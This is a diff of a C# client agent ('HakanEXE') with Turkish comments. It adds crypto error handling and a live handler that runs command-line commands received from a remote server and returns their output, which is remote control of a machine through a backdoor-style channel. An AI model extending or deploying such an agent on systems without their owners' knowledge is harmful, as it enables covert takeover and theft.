@@ -3,13 +3,12 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using HakanEXE.Server.Models; // Server'a proje referansı ŞART!
+using HakanEXE.Server.Models;
 using Newtonsoft.Json;
 using System.IO;
 using System.Net.NetworkInformation;
 using System.Linq;
 using System.Net;
-// System.Management, SystemInfoGatherer içinde kullanılıyor.
 
 namespace HakanEXE.Agent.Core
 {
@@ -33,10 +32,10 @@ namespace HakanEXE.Agent.Core
         public void Start()
         {
             Console.WriteLine("Agent başlatılıyor...");
-            _myClientInfo = GetInitialClientInfo(); // Bu metot AgentClient içinde tanımlı olmalı
+            _myClientInfo = GetInitialClientInfo();
 
             Task.Run(() => ConnectToServer());
-            ListenForDiscoveryRequests(); // Ağda bulunabilirlik için
+            ListenForDiscoveryRequests();
         }
 
         private ClientInfo GetInitialClientInfo()
@@ -132,6 +131,10 @@ namespace HakanEXE.Agent.Core
             }
             catch (ObjectDisposedException) { Console.WriteLine("ReceiveData: Nesne (stream/client) dispose edilmiş."); }
             catch (IOException ioEx) { Console.WriteLine($"ReceiveData IOException: {ioEx.Message}"); }
+            catch (System.Security.Cryptography.CryptographicException cryptoEx) // Kripto hatalarını özellikle yakala
+            {
+                Console.WriteLine($"ReceiveData CryptographicException: {cryptoEx.Message}. Veri: {BitConverter.ToString(dataBuffer ?? new byte[0]).Replace("-", "")}");
+            }
             catch (Exception ex) { Console.WriteLine($"ReceiveData içinde beklenmedik hata: {ex.ToString()}"); }
             finally
             {
@@ -177,6 +180,11 @@ namespace HakanEXE.Agent.Core
             }
             catch (ObjectDisposedException) { Console.WriteLine("SendPacketInternal: Nesne (stream) dispose edilmiş."); _isConnected = false; }
             catch (IOException ioEx) { Console.WriteLine($"SendPacketInternal IOException: {ioEx.Message}"); _isConnected = false; }
+            catch (System.Security.Cryptography.CryptographicException cryptoEx) // Kripto hatalarını özellikle yakala
+            {
+                Console.WriteLine($"SendPacketInternal CryptographicException: {cryptoEx.Message}");
+                _isConnected = false;
+            }
             catch (Exception ex) { Console.WriteLine($"SendPacketInternal içinde hata: {ex.ToString()}"); _isConnected = false; }
         }
 
@@ -184,20 +192,34 @@ namespace HakanEXE.Agent.Core
         private void HandleCommand(Packet commandPacket)
         {
             Console.WriteLine($"Komut Alındı: {commandPacket.PacketType}, Data: '{commandPacket.Data}'");
+            string responseData = null; // Yanıt verisini tutacak değişken
 
             switch (commandPacket.PacketType)
             {
                 case PacketType.OpenNotepad:
                     Console.WriteLine("OpenNotepad komutu işleniyor...");
-                    CommandExecutor.OpenNotepad(); // CommandExecutor.cs'teki metodu çağır
+                    CommandExecutor.OpenNotepad();
+                    // Bu komut için özel bir yanıt gerekmiyor.
+                    break;
+
+                case PacketType.ExecuteCommand:
+                    Console.WriteLine($"ExecuteCommand komutu işleniyor: {commandPacket.Data}");
+                    responseData = CommandExecutor.ExecuteCmdCommand(commandPacket.Data);
+                    // Komut çıktısını sunucuya geri gönder
+                    SendPacketInternal(new Packet
+                    {
+                        PacketType = PacketType.CommandOutput, // Yanıt tipi
+                        Data = responseData,
+                        SenderIp = _myClientInfo.IpAddress // Agent'ın IP'si
+                    });
+                    Console.WriteLine("ExecuteCommand çıktısı sunucuya gönderildi.");
                     break;
 
                 // Diğer komutlar için case'ler buraya eklenecek
                 // Örnek:
-                // case PacketType.ExecuteCommand:
-                //    Console.WriteLine($"ExecuteCommand komutu işleniyor: {commandPacket.Data}");
-                //    string output = CommandExecutor.ExecuteCmdCommand(commandPacket.Data);
-                //    // Çıktıyı sunucuya geri gönderme mantığı eklenecek
+                // case PacketType.Shutdown:
+                //    Console.WriteLine("Shutdown komutu işleniyor...");
+                //    CommandExecutor.Shutdown();
                 //    break;
 
                 default:
